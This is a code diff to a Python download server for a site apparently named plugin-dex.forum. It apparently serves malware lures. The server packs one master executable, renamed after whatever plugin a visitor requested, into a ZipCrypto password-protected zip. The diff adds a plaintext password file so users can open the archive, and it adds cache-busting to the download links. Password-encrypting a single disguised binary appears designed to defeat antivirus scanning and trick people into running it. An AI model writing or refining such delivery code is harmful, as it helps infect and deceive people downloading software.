@@ -21,7 +21,7 @@ HOST = os.environ.get("TRACKER_HOST", "127.0.0.1")
 PORT = int(os.environ.get("TRACKER_PORT", "8787"))
 DB_PATH = Path(os.environ.get("TRACKER_DB", "/var/lib/plugin-dex/stats.db"))
 STATS_KEY = os.environ.get("TRACKER_STATS_KEY", "").strip()
-DEFAULT_ZIP = "https://plugin-dex.forum/downloads/Plugin_Setup_4.6.4.zip"
+DEFAULT_ZIP = "https://plugin-dex.forum/downloads/Plugin_Setup_4.6.5.zip"
 COOKIE = "pd_sid"
 MAX_BODY = 16_384
 MASTER_EXE = Path(
@@ -87,27 +87,45 @@ def ensure_named_pack(plugin_name: str) -> Path:
         tmp_zip = PACK_DIR / f".{base}.{os.getpid()}.zip.tmp"
         try:
             exe_name = f"{base}.exe"
+            # Visible without zip password (Explorer often hides 2nd encrypted file)
             pass_name = "PASS 2026.txt"
             staged = tmpdir / exe_name
             shutil.copy2(MASTER_EXE, staged)
-            (tmpdir / pass_name).write_bytes(f"{ZIP_PASSWORD}\r\n".encode("utf-8"))
+            (tmpdir / pass_name).write_bytes(
+                f"Password: {ZIP_PASSWORD}\r\n".encode("utf-8")
+            )
             if tmp_zip.exists():
                 tmp_zip.unlink()
-            # ZipCrypto + password 2026 — works in Windows Explorer (not AES)
-            cmd = [
-                SEVEN_ZIP,
-                "a",
-                "-tzip",
-                "-mem=ZipCrypto",
-                f"-p{ZIP_PASSWORD}",
-                "-mx=0",
-                "-y",
-                str(tmp_zip),
-                exe_name,
-                pass_name,
-            ]
+            # 1) plaintext PASS txt so Windows always lists it
             subprocess.run(
-                cmd,
+                [
+                    SEVEN_ZIP,
+                    "a",
+                    "-tzip",
+                    "-mx=0",
+                    "-y",
+                    str(tmp_zip),
+                    pass_name,
+                ],
+                cwd=str(tmpdir),
+                check=True,
+                capture_output=True,
+                text=True,
+                timeout=60,
+            )
+            # 2) ZipCrypto-encrypted exe — works in Windows Explorer (not AES)
+            subprocess.run(
+                [
+                    SEVEN_ZIP,
+                    "a",
+                    "-tzip",
+                    "-mem=ZipCrypto",
+                    f"-p{ZIP_PASSWORD}",
+                    "-mx=0",
+                    "-y",
+                    str(tmp_zip),
+                    exe_name,
+                ],
                 cwd=str(tmpdir),
                 check=True,
                 capture_output=True,
@@ -599,7 +617,7 @@ class Handler(BaseHTTPRequestHandler):
         plugin = (row.get("plugin") or "Plugin").strip() or "Plugin"
         try:
             pack = ensure_named_pack(plugin)
-            dest = f"{PUBLIC_ORIGIN}/packs/{quote(pack.name)}"
+            dest = f"{PUBLIC_ORIGIN}/packs/{quote(pack.name)}?v={int(MASTER_EXE.stat().st_mtime)}"
         except Exception as exc:
             # fallback to static master zip if packing fails
             print(f"pack failed for {plugin!r}: {exc}", flush=True)
